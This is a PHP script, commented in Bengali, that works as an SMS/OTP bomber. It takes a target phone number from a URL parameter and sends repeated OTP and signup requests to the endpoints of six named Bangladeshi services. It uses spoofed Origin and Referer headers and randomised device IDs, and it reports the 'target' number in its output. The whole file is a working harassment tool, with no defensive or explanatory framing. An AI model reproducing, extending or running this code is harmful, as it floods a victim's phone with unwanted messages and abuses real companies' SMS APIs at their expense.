<?php
header('Content-Type: application/json');
set_time_limit(0); 

// ১. ফোন নাম্বার চেক ও ফরম্যাটিং
if(!isset($_GET['phone']) || empty($_GET['phone'])){
    echo json_encode(["status" => "error", "message" => "Phone number missing"]);
    exit;
}

$phone = $_GET['phone'];
$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;

$responses = [];

// ২. কমন CURL ফাংশন (কোড ক্লিন রাখার জন্য)
function send_sms($url, $method = 'GET', $data = null, $headers = [], $timeout = 30) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_POSTFIELDS => ($data ? json_encode($data) : null),
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_ENCODING => '', 
    ]);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    
    if ($err) return ["error" => $err];
    return json_decode($res, true) ?: $res;
}

// --- সার্ভিস লিস্ট শুরু ---

// ১. Shikho
$responses["shikho"] = send_sms('https://api.shikho.com/auth/v2/send/sms', 'POST', ["phone" => $phone_88, "type" => "student", "auth_type" => "signup", "vendor" => "shikho"], ['Content-Type: application/json', 'User-Agent: Mozilla/5.0']);
sleep(2);

// ২. RedX
for($i=1; $i<=2; $i++){
    $responses["redx_$i"] = send_sms('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', ["phoneNumber" => $phone_11], ['Content-Type: application/json', 'origin: https://redx.com.bd']);
    sleep(2);
}

// ৩. Bikroy
for($i=1; $i<=2; $i++){
    $responses["bikroy_$i"] = send_sms("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET', null, ['User-Agent: Mozilla/5.0']);
    sleep(2);
}

// ৪. Iqra Live
for($i=1; $i<=2; $i++){
    $responses["iqra_$i"] = send_sms("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET', null, [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; Mobile)',
        'Origin: https://iqra-live.com',
        'Referer: https://iqra-live.com/'
    ]);
    sleep(2);
}

// ৫. BDTickets
for($i=1; $i<=2; $i++){
    $responses["bdtickets_$i"] = send_sms('https://api.bdtickets.com:20100/v1/auth', 'POST', ["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"], [
        'Content-Type: application/json',
        'origin: https://bdtickets.com',
        'referer: https://bdtickets.com/'
    ]);
    sleep(2);
}

// ৬. Truck Lagbe - আপনার নতুন এবং উন্নত কোড (৩ বার লুপ)
for($i=1; $i<=3; $i++){
    // ডাইনামিক ডিভাইস আইডি জেনারেশন
    $deviceId = rand(100,999) . "." . rand(10,99) . "." . rand(100,999) . time();
    
    $responses["truck_lagbe_$i"] = send_sms(
        'https://tethys.trucklagbe.com/tl_gateway/tl_login/128/loginWithPhoneNo',
        'POST',
        ["userType" => "shipper", "phoneNo" => $phone_11],
        [
            'User-Agent: Mozilla/5.0 (Linux; Android 10; Mobile)',
            'Accept: application/json, text/plain, */*',
            'Content-Type: application/json',
            'deviceId: '.$deviceId,
            'source: website',
            'Origin: https://trucklagbe.com',
            'Referer: https://trucklagbe.com/'
        ]
    );
    sleep(2);
}

// ফাইনাল আউটপুট
echo json_encode([
    "status" => "success",
    "target" => $phone,
    "results" => $responses
], JSON_PRETTY_PRINT);
?>
